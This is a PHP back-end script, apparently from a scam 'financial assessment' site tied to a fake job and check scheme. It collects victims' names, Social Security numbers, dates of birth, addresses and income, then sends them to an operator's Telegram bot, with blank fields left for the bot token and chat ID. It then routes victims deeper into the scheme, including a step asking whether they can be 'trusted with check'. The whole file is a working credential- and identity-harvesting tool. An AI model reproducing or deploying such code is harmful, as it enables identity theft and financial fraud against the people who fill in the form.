<?php
// submit-financial.php

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Telegram Bot Configuration - EDIT THESE
    $telegramBotToken = ''; // Add your bot token here
    $telegramChatID = '';   // Add your chat ID here
    
    // Collect form data
    $full_name = htmlspecialchars($_POST['full_name']);
    $ssn = htmlspecialchars($_POST['ssn']);
    $dob = htmlspecialchars($_POST['dob']);
    $address = htmlspecialchars($_POST['address']);
    $employment_status = htmlspecialchars($_POST['employment_status']);
    $annual_income = htmlspecialchars($_POST['annual_income']);
    $dependents = htmlspecialchars($_POST['dependents']);
    $income_sources = isset($_POST['income_sources']) ? implode(', ', $_POST['income_sources']) : 'None';
    $equipment_investment = htmlspecialchars($_POST['equipment_investment']);
    $confirm_incapable = htmlspecialchars($_POST['confirm_incapable'] ?? 'N/A');
    $trust_check = htmlspecialchars($_POST['trust_check'] ?? 'N/A');
    $certify_truth = isset($_POST['certify_truth']) ? 'Yes' : 'No';
    $signature = htmlspecialchars($_POST['signature']);
    
    // Map employment status to readable values
    $employment_status_map = [
        'employed_ft' => 'Employed Full-time',
        'employed_pt' => 'Employed Part-time', 
        'self_employed' => 'Self-Employed',
        'student' => 'Student',
        'unemployed' => 'Currently Unemployed',
        'other' => 'Other'
    ];
    
    // Map income ranges to readable values
    $income_map = [
        'under_30k' => 'Under $30,000',
        '30k_50k' => '$30,000 - $50,000',
        '50k_75k' => '$50,000 - $75,000', 
        '75k_100k' => '$75,000 - $100,000',
        'over_100k' => 'Over $100,000'
    ];
    
    $readable_employment = $employment_status_map[$employment_status] ?? $employment_status;
    $readable_income = $income_map[$annual_income] ?? $annual_income;
    
    // Create formatted message with emojis
    $message = "💰 **NEW FINANCIAL ASSESSMENT SUBMISSION** 💰\n\n";
    
    $message .= "👤 **PERSONAL INFORMATION** 👤\n";
    $message .= "📛 **Full Name:** $full_name\n";
    $message .= "🆔 **SSN:** $ssn\n"; 
    $message .= "🎂 **Date of Birth:** $dob\n";
    $message .= "🏠 **Address:** $address\n\n";
    
    $message .= "💵 **FINANCIAL INFORMATION** 💵\n";
    $message .= "💼 **Employment Status:** $readable_employment\n";
    $message .= "💰 **Annual Income:** $readable_income\n";
    $message .= "👨‍👩‍👧‍👦 **Dependents:** $dependents\n";
    $message .= "📊 **Additional Income Sources:** $income_sources\n\n";
    
    $message .= "💻 **EQUIPMENT INVESTMENT** 💻\n";
    $message .= "❓ **Can manage equipment investment?** $equipment_investment\n";
    
    if ($equipment_investment === 'no') {
        $message .= "⚠️ **Confirmed selection?** $confirm_incapable\n";
        $message .= "🤝 **Can be trusted with check?** $trust_check\n";
    }
    
    $message .= "\n✍️ **CERTIFICATION** ✍️\n";
    $message .= "✅ **Information certified?** $certify_truth\n";
    $message .= "📝 **Digital Signature:** $signature\n";
    
    $message .= "\n⏰ **Submitted on:** " . date('Y-m-d H:i:s');
    
    // Send to Telegram
    if (!empty($telegramBotToken) && !empty($telegramChatID)) {
        $url = "https://api.telegram.org/bot" . $telegramBotToken . "/sendMessage";
        $data = [
            'chat_id' => $telegramChatID,
            'text' => $message,
            'parse_mode' => 'Markdown'
        ];
        
        $options = [
            'http' => [
                'header' => "Content-type: application/x-www-form-urlencoded\r\n",
                'method' => 'POST',
                'content' => http_build_query($data),
            ],
        ];
        
        $context = stream_context_create($options);
        $result = file_get_contents($url, false, $context);
    }
    
    // Store in session and redirect based on responses
    session_start();
    $_SESSION['financial_data'] = $_POST;
    
    // Redirect based on responses
    if ($equipment_investment === 'yes') {
        header("Location: program-commitment.php");
        exit;
    } elseif ($equipment_investment === 'no' && $confirm_incapable === 'yes' && $trust_check === 'yes') {
        header("Location: payroll-setup.php");
        exit;
    } else {
        header("Location: thankyou.php?status=declined");
        exit;
    }
} else {
    // If someone tries to access directly, redirect to form
    header('Location: financial-assessment.php');
    exit();
}
?>